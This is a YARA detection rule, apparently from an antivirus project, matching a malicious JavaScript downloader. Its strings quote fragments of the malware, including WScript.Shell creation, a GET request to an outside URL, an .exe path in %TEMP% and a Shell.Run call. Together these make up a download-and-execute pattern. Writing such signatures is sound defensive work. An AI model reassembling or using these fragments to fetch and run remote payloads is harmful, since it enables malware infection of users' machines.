rule sig_20160328_9fbcf556a3d1a3558e0ae86c7dea6cac {
  meta:
    description = "datamaliciousorder - file 20160328_9fbcf556a3d1a3558e0ae86c7dea6cac.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "91a5e6debd0caddabcb8daef0f94d70acaeee2c324c5d283ffc0f8dc25371c6b"

  strings:
    $s1  = "function Yldsxeee() {return Gsxmzelee[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"7bkKWMCs.exe\";};" fullword ascii
    $s2  = "do {WScript[Mwpjfmzevb](Shlhbc() * 11)} while (Qpakjk[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Gsxmzelee = function Fqqqoso() {return WScript[Ebtkdac](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Qpakjk[Xmxdii](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "function Tkldrul(Zilcjofjns, Ddjuk){return Zilcjofjns - Ddjuk;};" fullword ascii
    $s6  = "function Akrpi(Mmcyudh){Gsxmzelee[\"Run\"](Mmcyudh, Dhwiykgy, Dhwiykgy);};" fullword ascii
    $s7  = "function Huwkqh() {return ((Fxydyony == true) && (Fxydyony == Pqems)) ? 1 : Dhwiykgy;};" fullword ascii
    $s8  = "function Kccmkda(){return Ebtkdac;};" fullword ascii
    $s9  = "function Shlhbc(){return 22;};" fullword ascii
    $s10 = "var Robruowg = new this[\"Date\"]();" fullword ascii
    $s11 = "var Vcwhi = false;" fullword ascii
    $s12 = "function Qgsinkii()" fullword ascii
    $s13 = "function Kclobxngxz(Nmslep) {var Cwsqljbm = (1, 2, 3, 4, 5, Nmslep); return Cwsqljbm;};" fullword ascii
    $s14 = "Fxydyony = true; " fullword ascii
    $s15 = " while (Jrbqhoxwwz){" fullword ascii
    $s16 = "Pqems = true; " fullword ascii
    $s17 = "return Tkldrul(Msgwydhyug, Ofnjzsya);" fullword ascii
    $s18 = "function Vrnhcjk(){return Jxnqls;};" fullword ascii
    $s19 = "var Pqems = false;" fullword ascii
    $s20 = "var Fxydyony = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}